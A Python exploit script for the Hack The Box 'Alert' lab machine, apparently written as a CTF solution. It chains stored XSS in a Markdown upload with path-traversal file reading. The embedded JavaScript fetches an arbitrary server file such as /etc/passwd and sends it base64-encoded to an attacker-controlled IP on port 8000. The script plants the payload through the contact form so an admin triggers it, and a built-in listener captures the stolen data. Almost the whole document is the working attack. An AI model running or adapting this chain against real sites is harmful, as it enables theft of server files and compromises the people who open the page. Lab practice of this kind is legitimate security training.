import requests
import re
import argparse
import sys
import asyncio
import base64


def parse_arguments():
    """
    Get parameters from user
    """
    parser = argparse.ArgumentParser(description="Request files to read files at HTB Alert Machine (XSS to LFI).")
    parser.add_argument("-i", "--attacker-ip", type=str, help="Our attacker IP address to send the extracted data.", required=True)
    parser.add_argument("-f" ,"--filename", type=str, help="Name of the file to read (absolute path, e.g., '/etc/passwd')", required=True)
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()


def post_payload(url: str, file_to_read: str, attacker_ip: str)->str|None:
    """
    Post XSS Payload to Markdown converter to generate a share link
    """
    post_url = f"{url}/visualizer.php"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
               "Accept-Language": "en-US,en;q=0.5", 
               "Accept-Encoding": "gzip, deflate, br", 
               "Content-Type": "multipart/form-data; boundary=---------------------------302486761919196570801058130125", 
               "Origin": url, 
               "DNT": "1", 
               "Connection": "close", 
               "Referer": f"{url}/index.php?page=alert", 
               "Upgrade-Insecure-Requests": "1"}
    data = f"-----------------------------302486761919196570801058130125\r\nContent-Disposition: form-data; name=\"file\"; filename=\"payload.md\"\r\nContent-Type: text/markdown\r\n\r\n<script>\nfetch(\"http://alert.htb/messages.php?file=../../../../../../..{file_to_read}\")\n  .then(response => response.text())\n  .then(data => {{\n    fetch(\"http://{attacker_ip}:8000/?encodedData=\" + btoa(data));\n  }});\n</script>\n\r\n-----------------------------302486761919196570801058130125--\r\n"
    r = requests.post(post_url, headers=headers, data=data)
    if r.status_code != 200:
        print(f"[-] Got invalid status code for POST request uploading the Markdown file. Status code {r.status_code}. Please check and retry...")
        sys.exit(1)
    # Use regular expressions to get the share link
    match = re.search(r'link_share=([^\"]+)', r.text)
    if match:
        share_link: str = f'http://alert.htb/visualizer.php?link_share={match.group(1)}'
        print(f"[+] Share link: {share_link}")
        return share_link
    print(f"[-] No share link found. This is the response text:{100*'='}\n{r.text}\n{100*'='}\nPlease check and retry...")
    sys.exit(1)


def send_XSS(url: str, share_link: str):
    post_url = f"{url}/contact.php"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://alert.htb", "DNT": "1", "Connection": "close", "Referer": "http://alert.htb/index.php?page=contact&status=Message%20sent%20successfully!", "Upgrade-Insecure-Requests": "1"}
    data = {"email": "test@test.com", 
                  "message": share_link}
    print("[+] Sending request to contact form...")
    requests.post(post_url, headers=headers, data=data)


async def start_server(verbose_option: bool = False):
    """
    Starts an asynchronous HTTP server to capture the GET request and process encoded data.
    """
    async def handle_request(reader, writer, verbose_option=verbose_option):
        # Read the incoming HTTP request
        data = await reader.read(8192)
        request = data.decode()
        # Use regex to extract the 'encodedData' parameter value
        match = re.search(r'encodedData=([^ ]+)', request)
        if match:
            encoded_data = match.group(1)
            if verbose_option:
                print(f"[+] Encoded Data:\n{encoded_data}")
            # Decode the base64-encoded data
            try:
                decoded_data = base64.b64decode(encoded_data).decode()
                if decoded_data.startswith('<pre>'):
                    decoded_data = re.sub('<pre>', '', decoded_data)
                if " ".join(decoded_data.split()).endswith('</pre>'):
                    decoded_data = re.sub('</pre>', '', decoded_data)
                print(f"[+] Decoded Data:\n{100*'='}\n\n{decoded_data}\n{100*'='}")
            except Exception as e:
                print(f"[-] Failed to decode data: {e}")
        writer.close()
        await writer.wait_closed()
    # Start the HTTP server
    server = await asyncio.start_server(handle_request, '', 8000)
    addr = server.sockets[0].getsockname()
    print(f"[+] Serving server on {addr}")
    # Run the server for 6 seconds, then shut it down
    await asyncio.sleep(6)
    server.close()
    await server.wait_closed()
    print("[+] Shutting down server.")


async def main():
    # Get arguments from user
    args = parse_arguments()
    # Set machine url
    url: str = 'http://alert.htb'
    # Start an HTTP server asynchronously to get requests
    server_task = asyncio.create_task(start_server(args.verbose))
    # Wait briefly to ensure the server is running
    await asyncio.sleep(1)
    # Here starts the attack. Get share link after using Markdown converter.
    share_link: str = post_payload(url, args.filename, args.attacker_ip)
    # Send the share link to contact form to trigger LFI
    send_XSS(url, share_link)
    # Wait for the server to shut down
    await server_task

if __name__ == "__main__":
    asyncio.run(main())
